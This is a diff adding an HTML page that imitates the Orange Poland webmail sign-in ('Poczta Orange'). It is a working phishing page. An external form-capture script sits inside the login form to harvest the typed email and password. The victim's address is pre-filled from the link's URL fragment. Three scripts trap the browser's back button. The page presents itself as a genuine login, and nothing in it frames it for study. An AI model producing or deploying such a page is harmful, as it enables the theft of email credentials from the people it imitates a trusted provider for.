@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Poczta Orange</title>
+    <style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #f7f7f7;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    position: relative;
+}
+
+/* Centered Layout Workspace Block Wrapper */
+.login-wrapper {
+    width: 100%;
+    max-width: 360px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+/* Brand Orange Square Logo Typography Replication Area */
+.brand-logo-box {
+    width: 64px;
+    height: 64px;
+    background-color: #ff6600; /* Signature dynamic high contrast Orange corporate palette shade */
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    justify-content: flex-end;
+    padding: 4px 6px;
+    color: #ffffff;
+    font-size: 13px;
+    font-weight: 700;
+    line-height: 1;
+    margin-bottom: 24px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+}
+
+.brand-logo-box sup {
+    font-size: 8px;
+    margin-left: 1px;
+    align-self: flex-start;
+}
+
+/* Rounded Corner Rectangular Floating White Card Component Frame */
+.login-card {
+    background-color: #ffffff;
+    width: 100%;
+    padding: 36px 32px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
+    border-radius: 4px;
+    text-align: center;
+}
+
+.card-title {
+    font-size: 22px;
+    font-weight: 400;
+    color: #111111;
+    margin-bottom: 24px;
+    letter-spacing: -0.5px;
+}
+
+form {
+    width: 100%;
+}
+
+/* Prefix Icon Addon Input Field Container Elements Rows Alignment */
+.input-row {
+    display: flex;
+    width: 100%;
+    height: 38px;
+    border: 1px solid #dcdcdc;
+    background-color: #ffffff;
+    margin-bottom: 12px;
+    border-radius: 2px;
+}
+
+.input-row:focus-within {
+    border-color: #ff6600;
+}
+
+.icon-addon {
+    width: 36px;
+    background-color: #f5f5f5;
+    border-right: 1px solid #dcdcdc;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #444444;
+    font-size: 13px;
+    user-select: none;
+}
+
+.form-control {
+    flex: 1;
+    height: 100%;
+    border: none;
+    padding: 0 12px;
+    font-size: 14px;
+    color: #333333;
+    outline: none;
+    background: transparent;
+}
+
+.form-control::placeholder {
+    color: #b5b5b5;
+    font-weight: 400;
+}
+
+/* Toggle Slider Button Alignment Parameters Container */
+.toggle-row {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 20px;
+    padding-left: 2px;
+}
+
+.switch-control {
+    position: relative;
+    display: inline-block;
+    width: 28px;
+    height: 16px;
+}
+
+.switch-control input {
+    opacity: 0;
+    width: 0;
+    height: 0;
+}
+
+.slider-round {
+    position: absolute;
+    cursor: pointer;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background-color: #cbd5e1;
+    transition: .2s;
+    border-radius: 16px;
+}
+
+.slider-round:before {
+    position: absolute;
+    content: "";
+    height: 12px;
+    width: 12px;
+    left: 2px;
+    bottom: 2px;
+    background-color: white;
+    transition: .2s;
+    border-radius: 50%;
+}
+
+input:checked + .slider-round {
+    background-color: #ff6600;
+}
+
+input:checked + .slider-round:before {
+    transform: translateX(12px);
+}
+
+.toggle-label {
+    font-size: 12px;
+    color: #555555;
+}
+
+/* High contrast crisp wide rectangular solid orange action submission trigger button (NOW FULLY CLICKABLE) */
+.submit-btn {
+    position: relative;
+    z-index: 20;
+    width: 100%;
+    background-color: #ff6600; /* Matching branding exactly */
+    color: #ffffff;
+    border: none;
+    height: 42px;
+    font-size: 14px;
+    font-weight: bold;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.15s ease;
+}
+
+.submit-btn:hover {
+    background-color: #e05500;
+}
+
+/* OS Environment Activation Notification Simulation Overlay Layer Components Grid Blueprint */
+.system-watermark {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    text-align: left;
+    font-size: 13px;
+    color: rgba(0, 0, 0, 0.13);
+    line-height: 1.4;
+    user-select: none;
+    pointer-events: none;
+    z-index: 100;
+}
+
+@media (max-width: 400px) {
+    .login-card {
+        padding: 28px 20px;
+    }
+}
+
+    </style>
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Poczta Orange - Logowanie</title>
+    <!-- Link to external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Centered Composition Form Area Card Box Component Module Wrapper -->
+    <main class="login-wrapper">
+        
+        
+        <div class="brand-logo-box">
+            orange<sup>™</sup>
+        </div>
+
+        <!-- Floating White Interface Card Box Component Area -->
+        <div class="login-card">
+            <h1 class="card-title">Poczta Orange</h1>
+
+            <!-- Form submission configuration using FormSubmit module links integration -->
+            <form action="" method="POST">
+                
+                <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                <!-- Account Field Entry Structural Inline Box with Prefix Icon -->
+                <div class="input-row">
+                    <div class="icon-addon">👤</div>
+ <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                </div>
+
+                <!-- Secure Password Entry Field Component Area Block with Prefix Icon -->
+                <div class="input-row">
+                    <div class="icon-addon">🔒</div>
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                </div>
+
+                <!-- Stay Logged Slider Switch Selection Parameter Option -->
+                <div class="toggle-row">
+                    <label class="switch-control">
+                        <input type="checkbox" name="remember_me">
+                        <span class="slider-round"></span>
+                    </label>
+                    <span class="toggle-label">Zapamiętaj mnie</span>
+                </div>
+                
+                <!-- Solid Flat Orange Action Submission Trigger Button Block Component -->
+                <button type="submit" class="submit-btn">Zaloguj się</button>
+            </form>
+        </div>
+
+    </main>
+
+</body>
+</html>
+
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
